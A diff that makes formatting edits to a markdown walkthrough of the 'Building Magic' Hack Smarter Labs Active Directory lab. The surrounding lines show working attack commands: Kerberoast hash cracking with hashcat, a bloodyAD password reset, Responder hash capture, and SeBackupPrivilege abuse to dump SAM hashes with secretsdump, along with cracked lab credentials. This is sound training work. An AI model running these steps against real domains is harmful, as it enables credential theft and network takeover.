@@ -1,6 +1,6 @@
 # Building Magic (Hack Smarter Labs)
 
-## - Scope and Objective
+## Scope and Objective
 
 **Objective:** As a penetration tester on the Hack Smarter Red Team, your aim is to achieve a full compromise of the Active Directory environment.
 
@@ -245,7 +245,7 @@ hashcat -m 13100 output.txt /usr/share/wordlists/rockyou.txt
 `r.haggard:rubeushagrid`
 
 ### Compromising the `h.potch` User
-The `r.haggard` user has an outbound object control (change password) over the `h.potch` user.
+- The `r.haggard` user has an outbound object control (change password) over the `h.potch` user.
 ```bash
 bloodyAD -d buildingmagic.local -u 'r.haggard' -p 'rubeushagrid' --dc-ip 10.0.29.68 set password h.potch 123456  
 [+] Password changed successfully!
@@ -289,14 +289,15 @@ SLINKY      10.0.29.68      445    DC01             [+] Created LNK file on the 
 ```bash
 sudo responder -I tun0 -dP
 ```
-Using responder we caught the hash of the user `h.grangon`.
+- Using responder we caught the hash of the user `h.grangon`.
 
 ### Hash Cracking
 ```bash
 hashcat -m 13100 output2.txt /usr/share/wordlists/rockyou.txt
 ```
 `h.grangon:magic4ever`
-The `h.grangon` user is a member of the Remote Management Users group.
+
+> The `h.grangon` user is a member of the Remote Management Users group.
 
 ### Initial System Access
 ```bash
@@ -381,7 +382,7 @@ User claims unknown.
 
 Kerberos support for Dynamic Access Control on this device has been disabled.
 ```
-The user has `SeBackupPrivilege` enabled.
+- The user has `SeBackupPrivilege` enabled.
 
 ```bash
 mkdir C:\temp
@@ -397,7 +398,7 @@ Info: Download successful!
 Info: Downloading C:\temp\system.hive to system.hive
 Info: Download successful!
 ```
-Use the `impacket-secretsdump` from the `impacket` library to dump the NTLM hashes.
+- Use the `impacket-secretsdump` from the `impacket` library to dump the NTLM hashes.
 
 ```bash
 impacket-secretsdump -sam sam.hive -system system.hive LOCAL
